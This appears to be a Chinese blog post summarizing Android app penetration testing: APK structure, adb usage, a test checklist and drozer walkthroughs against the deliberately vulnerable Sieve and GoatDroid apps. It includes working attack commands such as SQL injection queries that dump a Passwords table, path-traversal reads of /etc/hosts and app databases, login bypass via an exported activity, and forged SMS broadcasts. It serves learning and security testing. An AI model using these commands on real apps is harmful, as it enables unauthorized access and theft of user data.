---
title: APP渗透总结
date: 2023/10/12 19:48:25
categories:
- 渗透测试 
tags:
- 安卓渗透
---



# Android知识

## APK文件

APK（Android Package）文件是Android操作系统上安装应用程序的一种文件格式。APK文件实际上是一个压缩文件，它包含了应用程序的所有代码、资源和其他文件。

APK文件通常具有以下结构：

1. `AndroidManifest.xml`：这是APK文件的主要配置文件，它包含应用程序的所有信息，包括应用程序名称、权限、组件等。

   ![image-20230926222419741](../../../images/image-20230926222419741.png)

2. `classes.dex`：这是APK文件中的核心代码文件，它包含了应用程序的所有Java代码。

   > DEX（Dalvik Executable）文件是一种专门为Android操作系统设计的可执行文件格式。它是将Java字节码转换为Dalvik字节码的结果。Dalvik字节码是一种特殊的字节码，用于在Android设备上执行Java代码。
   >
   > Android应用程序中的所有Java代码都被编译成DEX文件，然后打包到APK文件中。当用户安装应用程序时，DEX文件会被解压并加载到设备的内存中，以便在设备上执行应用程序。

3. `resources.arsc`: 包含了应用程序的所有非代码资源，如字符串、图像、布局、主题等等。该文件是应用程序中的重要组成部分，用于支持应用程序的多语言和多种配置。

   ![image-20230926222546190](../../../images/image-20230926222546190.png)

4. `lib/`：这个目录包含了应用程序使用的所有本地库文件，通常按照不同的CPU架构分别存放。

   ![image-20230926222612453](../../../images/image-20230926222612453.png)

5. `res/`：这个目录包含了应用程序的所有资源文件，例如布局、字符串、图像等。

   ![image-20230926222649268](../../../images/image-20230926222649268.png)

6. `assets/`：这个目录包含了应用程序的所有未编译的资源文件，例如声音、视频等。

   ![image-20230926222714428](../../../images/image-20230926222714428.png)

7. `META-INF/`：这个目录包含了APK文件的数字签名信息。

   ![image-20230926222742918](../../../images/image-20230926222742918.png)

   ![image-20230926222757403](../../../images/image-20230926222757403.png)



## Android 四大应用程序组件

安卓应用程序组件指的是构成安卓应用程序的基本单元，主要有以下四种：

|             组件名称             |                           具体用途                           |
| :------------------------------: | :----------------------------------------------------------: |
|         活动（Activity）         | 负责管理应用程序的用户界面，通过活动可以与用户交互即**呈现可供用户交互的界面** |
|         服务（Service）          | 在后台运行的组件，不具有用户界面，主要用于**执行长时间运行的任务或处理与用户界面无关的操作**。 |
| 广播接收器（Broadcast Receiver） | 用于接收系统广播和应用程序广播。即**注册特定事件，并在其发生时被激活**，例如电池电量变化、屏幕开关、网络连接状态等，也可以接收来自其他应用程序发送的广播。 |
|  内容提供者（Content Provider）  | 用于**管理应用程序的数据**，允许其他应用程序访问和共享应用程序的数据。内容提供者可以访问文件系统、SQLite 数据库、网络等数据源。 |



## Android应用存储数据

对 `android` 的每一个应用，`android` 系统会分配一个私有目录，用于存储应用的私有数据。此私有目录通常位于`/data/data/应用名称/`







# ADB使用

Android 调试桥 (`adb`) 是一种功能多样的命令行工具，可让您与设备进行通信。`adb` 命令可用于执行各种设备操作，例如安装和调试应用。`adb` 提供对 Unix shell（可用来在设备上运行各种命令）的访问权限。它是一种客户端-服务器程序，包括以下三个组件：

- 客户端（对应PC）：用于发送命令。客户端在开发机器上运行。您可以通过发出 `adb` 命令从命令行终端调用客户端。
- 守护程序 (adbd)：用于在设备上运行命令。守护程序在每个设备上作为后台进程运行。
- 服务端：用于管理客户端与守护程序之间的通信。服务器在开发机器上作为后台进程运行。

Android SDK默认自带`adb`，它位于Android SDK的platform-tools目录中



**常用命令**

```bash
adb version # 查看adb版本
adb devices -l # 列出设备
adb tcpip 5555 # 服务端开启5555端口
adb connect ip:port   # 连接设备
adb disconnect ip:port # 关闭设备连接
adb -s service command # 多个设备时-s指定设备
adb install path_to_apk -t # 安装apk
adb push  pc_file Android _path  # 上传文件
adb pull  Android _file pc_path # 下载文件

# 命令行操作
adb -s service shell   # 获得指定设备的shell
# 执行命令
adb -s service shell command
# 或者进入后
shell>command

# 命令在/system/bin中
pm list packages # 查看应用列表
pm list packages -e -3  # 查询设备上所有已启用的第三方应用程序的包名列表
getprop ro.build.version.release  # 安卓系统版本
screencap Android _path # 截图
screenrecord /sdcard/demo.mp4 # 录屏
```

**遇到的问题**

- more than one device and emulator

  ```
  使用-s参数指定设备
  ```

- adb server version (41) doesn't match this client (39); killing

  ```
  adb客户端和服务端版本不一致
  ```

- 由于找不到adbwinapi.dll,无法继续执行代码。重新安装程序可能会解决此问题

  环境变量问题

  解：将adb.exe文件复制到Windows/system32下;

  ​       将adbwinapi.dll复制到Windows/sysWoW64下。

![image-20230725151602776](../../../images/image-20230725151602776.png?lastModify=1695029992)

​			解决

![image-20230725151520659](../../../images/image-20230725151520659.png?lastModify=1695029992)

![image-20230725151508246](../../../images/image-20230725151508246.png?lastModify=1695029992)

​			更改名字，替换模拟器中的adb即可,成功截图

![image-20230725151826056](../../../images/image-20230725151826056.png?lastModify=1695029992)











- 







# 测试checklist

![905443_6J7WGQ2HGW4RUP4](../../../images/905443_6J7WGQ2HGW4RUP4.png)

## 客户端程序安全

### 安装包签名校验

> 如果 APK 没有 使用自己的证书进行签名，将会失去对版本管理的主动权。

```bash
jarsigner -verify -certs -verbose apk
```

![image-20230904114950022](../../../images/image-20230904114950022.png?lastModify=1695029992)

jadx-gui

![image-20230904115047184](../../../images/image-20230904115047184.png?lastModify=1695029992)

### 反编译保护

> 没有反编译保护，可能被恶意人员进行逆向破解等操作。

直接使用jadx-gui打开即可，如果混淆后的代码样例，除了覆写和接口以外的字段都是无意义的名称，则说明是安全的，如下即为安全的。

![image-20230927104447402](../../../images/image-20230927104447402.png)



### 应用完整性校检

> 攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。

**解包**

```bash
java -jar apktool.jar d -f APK -o DIR
```

**修改资源文件**

改一些容易分辨的，比如logo

`assets/pmbwe64/css/banklogo/logo`

![image-20230927110713736](../../../images/image-20230927110713736.png)

**打包**

```bash
java -jar apktool.jar b -f DIR -o new.apk
```

**对生成的APK进行签名**

> APK 必须进行签名后，方可安装和运行。如果开启了“允许未知来源的应 用”，那么 Debug 证书、自签名证书、过期证书的签名都是可以的，但是不可以不签 名。

```bash
java -jar signapk.jar testkey.x509.pem testkey.pk8 待签名APK 输出APK
```

**重新安装启动，观察是否有自校验**



### 不恰当的配置

- Debug模式

  > 客户端软件 `AndroidManifest.xml` 中的 `android:debuggable="true"`标记如果开启，可被Java 调试工具例如 jdb 进行调试，获取和篡改用户敏感信息，甚至分析并且修改代码实现的业务逻辑，我们经常使用 android.util.Log 来打印日志，软件发布后调试日志被其他开发者看到，容易被反编译破解。

- 应用程序数据可备份

  > `AndroidMainfest.xml` 文件中的 `allowBackup` 属性值控制，其默认值为 `true`。当该属性没有显式设置为 `false` 时,攻击者可通过 `adb backup` 和 `adb restore` 对 App 的应用数据进行备份和恢复，从而可能获取明文存储的用户敏感信息。

使用jadx-gui打开搜索即可



## 敏感信息安全测试

- APK反编译源码中泄漏的敏感信息

  ```
  jadx-gui搜索
  漏扫平台
  ```

- 私有目录下的文件权限

  ```
  ADB连接查看
  ```

- 私有目录下的文件信息泄漏

  ```
  ADB连接查找
  ```

- 日志是否打印敏感数据

  ```bash
  adb logcat //持续输出日志，直到 Ctrl+C 
  adb logcat -d > log.txt //一次性输出日志缓存，不会阻塞 
  ```


补充：[原创\]Android APP漏洞之战（7）——信息泄露漏洞详解-Android安全-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-271122.htm#msg_header_h3_12)





## 四大应用程序组件测试

测试用APK

https://github.com/as0ler/Android-Examples/blob/master/sieve.apk

[qark/tests/goatdroid.apk at master · linkedin/qark (github.com)](https://github.com/linkedin/qark/blob/master/tests/goatdroid.apk)



### **drozer安装**

**PC控制端安装**

```bash
# 安装依赖
python2 -m pip install wheel
python2 -m pip install pyyaml
python2 -m pip install pyhamcrest
python2 -m pip install protobuf
python2 -m pip install pyopenssl
python2 -m pip install twisted
python2 -m pip install service_identity

# 下载whl到本地
wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer-2.4.4-py2-none-any.whl
python2 -m pip install drozer-2.4.4-py2-none-any.whl
```

**设备端agent安装**

```bash
wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk
adb install drozer-agent-2.3.4.apk
```

**连接**

设备端开启drozer

![image-20231012214134944](../../../images/image-20231012214134944.png)

pc控制端（**注意在D:\python2.7\Scripts下启动drozer**）

```bash
# 端口转发
adb forward tcp:31415 tcp:31415
# 连接
drozer console connect
```

出现下图表示连接成功

![image-20231012214244755](../../../images/image-20231012214244755.png)

**乱码解决**

![image-20231012222013025](../../../images/image-20231012222013025.png)

`D:\python2.7\Lib\site-packages\drozer\modules\app`下的`package.py`

```python
# 开头添加
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

# 360,362行指定字符串为unicode字符串，前缀"u"
self.stdout.write(u"%s\n" % application.packageName)
```

![image-20231012222306823](../../../images/image-20231012222306823.png)





### Package

- **根据名字查找APK**

  ```bash
  # run app.package.list -f <packagename>
  dz> run app.package.list -f sieve
  com.mwr.example.sieve (Sieve)
  ```

- **获得APK的基本信息**

  ```bash
  # run app.package.info -a <packagename>
  dz> run app.package.info -a com.mwr.example.sieve
  Package: com.mwr.example.sieve
    Application Label: Sieve
    Process Name: com.mwr.example.sieve
    Version: 1.0
    Data Directory: /data/user/0/com.mwr.example.sieve
    APK Path: /data/app/com.mwr.example.sieve-1/base.apk
    UID: 10046
    GID: [3003]
    Shared Libraries: null
    Shared User ID: null
    Uses Permissions:
    - android.permission.READ_EXTERNAL_STORAGE
    - android.permission.WRITE_EXTERNAL_STORAGE
    - android.permission.INTERNET
    Defines Permissions:
    - com.mwr.example.sieve.READ_KEYS
    - com.mwr.example.sieve.WRITE_KEYS
  ```

- **一键检测APK存在的攻击面**

  ```bash
  dz> run app.package.attacksurface com.mwr.example.sieve
  Attack Surface:
    3 activities exported
    0 broadcast receivers exported
    2 content providers exported
    2 services exported
      is debuggable
  ```

  > `<packagename>`是包名。
>
  > 可以看到有3个activity、0个广播接收者、2个内容提供者和2个服务可以被导出，并且开启了debug模式

  

### Activity

| 漏洞种类                     | 危害                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| 越权绕过                     | Activity 用户界面绕过会造成用户信息窃取                      |
| 拒绝服务                     | 通过 Intent 给 Activity 传输畸形数据使得程序崩溃从而影响用户体验 |
| Activity 劫持                | 组件导出导致钓鱼欺诈，Activity 界面被劫持产生欺诈等安全事件  |
| 隐式启动 intent 包含敏感数据 | 敏感信息泄露                                                 |

#### **获取可导出activity**

在 Android 系统中，Activity 组件默认是不导出的，如果 `AndroidManifest.xml` 中设置了 `exported = "true"` 这样的关键值或者是添加了`<intent-filter>` 这样的属性，那么此时 Activity 组件是导出的，就会引发越权绕过或者是泄露敏感信息等的安全风险。

```xml
<activity android:name="com.my.app.Initial" android:exported="true">
</activity>
```

drozer获得可导出activity  

```bash
# run app.activity.info -a <packagename>
dz> run app.activity.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.FileSelectActivity
    Permission: null
  com.mwr.example.sieve.MainLoginActivity
    Permission: null
  com.mwr.example.sieve.PWList
    Permission: null
```



#### 越权绕过测试

正常第一次打开是这样的

![image-20231012232654681](../../../images/image-20231012232654681.png)

对应的是`MainLoginActivity`这个activity

![image-20231012232931968](../../../images/image-20231012232931968.png)

调用`PWList`这个activity，实现登录绕过界面

```
dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
```

![image-20231012232745487](../../../images/image-20231012232745487.png)

#### **Activity劫持**

```bash
# 环境准备
wget https://github.com/yanghaoi/android_app/raw/master/uihijackv2.0_sign.apk
# 安装点击劫持软件
adb install uihijackv2.0_sign.apk
```

劫持测试

```bash
dz> run app.package.list -f jack
com.test.uihijack (Hijack测试)

dz> run app.activity.start --component com.test.uihijack com.test.uihijack.MainActivity
```

在打开原activity的基础上，调用此组件，如果`uihijackv2.0_sign`界面位于被测软件上，则存在漏洞，否则不存在漏洞。如下图为存在漏洞的情况。

![image-20231012233356456](../../../images/image-20231012233356456.png)

#### 拒绝服务攻击

> 调用组件，查看是否导致拒绝服务，若程序出现 `程序崩溃`、`已停止运行` 等程序无法运行或自动退出行为则为攻击成功。

http://rui0.cn/archives/30



### Content-Provider

| 漏洞种类 | 危害             |
| -------- | ---------------- |
| 信息泄露 | 查看组件数据信息 |
| SQL注入  | 注入获取相关数据 |
| 目录遍历 | 访问任意可读文件 |

#### **查看 provider 数据组件信息**

```bash
run app.provider.info -a com.mwr.example.sieve
```

![image-20231013104113982](../../../images/image-20231013104113982.png)

#### **信息泄漏**

```bash
run scanner.provider.finduris -a com.mwr.example.sieve
```

![image-20231013104901284](../../../images/image-20231013104901284.png)

关注红框部分，可能存在数据泄露，查询语句如下

```bash
run app.provider.query <URI>
```

![image-20231013105050259](../../../images/image-20231013105050259.png)

#### sql注入

> Android使用的是sqlite
>
> [sqlite注入的一点总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8627)

进行sql注入扫描

```bash
run scanner.provider.injection -a <package>
```

![image-20231013105351961](../../../images/image-20231013105351961.png)

进一步利用

单引号报错

```bash
# 双引号内为注入的语句
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection "'"
```

![image-20231013110430578](../../../images/image-20231013110430578.png)

查询所有表

```bash
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```

![image-20231013110556263](../../../images/image-20231013110556263.png)

查询Passwords表

```bash
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection "* FROM Passwords;--"
```

![image-20231013110937259](../../../images/image-20231013110937259.png)



#### **目录遍历**

目录遍历漏洞扫描

```bash
run scanner.provider.traversal -a com.mwr.example.sieve
```

![image-20231013111123785](../../../images/image-20231013111123785.png)

利用目录遍历读取文件

`/etc/hosts`

```bash
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
```

![image-20231013111241044](../../../images/image-20231013111241044.png)

`应用db文件`

```bash
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db
```

下载文件

```bash
run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:/Users/Khaz/Desktop/database.db
```

![image-20231013111914892](../../../images/image-20231013111914892.png)



### Broadcast Receiver

|  漏 洞种类   |                             危害                             |
| :----------: | :----------------------------------------------------------: |
| 敏感信息泄露 | 发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。 |
|   权限绕过   | 可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过<receiver>标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</receiver> |
|   消息伪造   | 暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患 |
|   拒绝服务   | 如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。 拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。 |

#### 查看可导出组件 broadcast 

```bash
run app.broadcast.info -a org.owasp.goatdroid.fourgoats
```

![image-20231013112655673](../../../images/image-20231013112655673.png)

```
org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver
```



#### 找到对应广播

![image-20231013113616161](../../../images/image-20231013113616161.png)



#### 消息伪造

使用jadx反编译找到对应的源码信息，发现需要两个参数 phoneNumber、message

![image-20231013113543266](../../../images/image-20231013113543266.png)

发送恶意广播

```bash
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 12345 --extra string message khaz
```

![image-20231013114022116](../../../images/image-20231013114022116.png)



#### 拒绝服务

发送不完整的广播

```bash
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS
```

![image-20231013114122332](../../../images/image-20231013114122332.png)



### Services

|  漏洞种类   |                             危害                             |
| :---------: | :----------------------------------------------------------: |
|  权限提升   | 当一个service配置了intent`-`filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。 |
| service劫持 | 隐式启动services,当存在同名services,先安装应用的services优先级高 |
|  消息伪造   | 暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患 |
|  拒绝服务   | Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃 |

#### **获取可导出服务**

```bash
# run app.service.info -a <packagename>
dz> run app.service.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
  com.mwr.example.sieve.AuthService
    Permission: null
  com.mwr.example.sieve.CryptoService
    Permission: null
```







# 其他测试姿势

- 通过更改手机的型号来重置APP中的体验次数
- 





# 其他工具

**APP模拟器**

- 夜神模拟器>7.0.2（XPosed框架要求）


**反编译**

- jadx-gui
- [GDA主页-亚洲首款交互式Android反编译器](http://www.gda.wiki:9090/)

**APK签名**

- GetAPKInfo（验签）
- apktool（打包/解包）

- signapk（签名）

**APK漏扫**

- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
- [摸瓜-查诈骗APP*查病毒APP*免费APK反编译分析工具 (mogua.co)](https://mogua.co/)

**其他小工具**

- [AppInfoScanner](https://github.com/kelvinBen/AppInfoScanner)

  > 前提条件是脱了壳

  一款适用于以HW行动/红队/渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。

- [sulab999/AppMessenger: 一款适用于以APP病毒分析、APP漏洞挖掘、APP开发、HW行动/红队/渗透测试团队为场景的移动端(Android、iOS)辅助分析工具](https://github.com/sulab999/AppMessenger)

  ![image-20231013135314599](../../../images/image-20231013135314599.png)





# 参考文章

App安全检测指南

[https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/98.%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/01.Android%20APP%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.html](https://blog.gm7.org/个人知识库/04.移动安全/98.常规测试流程/01.Android APP常规测试流程.html)

[App防抓包有四种绕过方法（详细）](https://mp.weixin.qq.com/s?__biz=Mzg2NjUzNzg4Ng==&mid=2247483971&idx=1&sn=f4c726acbb472303b63c78bc442dddc8&chksm=ce481ab2f93f93a4cd3ba0cc1f66a6e98b25c6be28aacb19b0d228cb549967518d60da3858f3&cur_album_id=2988852703969787904&scene=189#wechat_redirect)

[如何使用Xposed+JustTrustMe来突破SSL Pinning - 知乎](https://zhuanlan.zhihu.com/p/36538699)

[Android 调试桥 (adb)  | Android 开发者  | Android Developers](https://developer.android.com/studio/command-line/adb.html?hl=zh-cn#pm)

推荐：[WindXaa/Android-Vulnerability-Mining: Android APP漏洞之战系列，主要讲述如何快速挖掘APP漏洞 (github.com)](https://github.com/WindXaa/Android-Vulnerability-Mining)

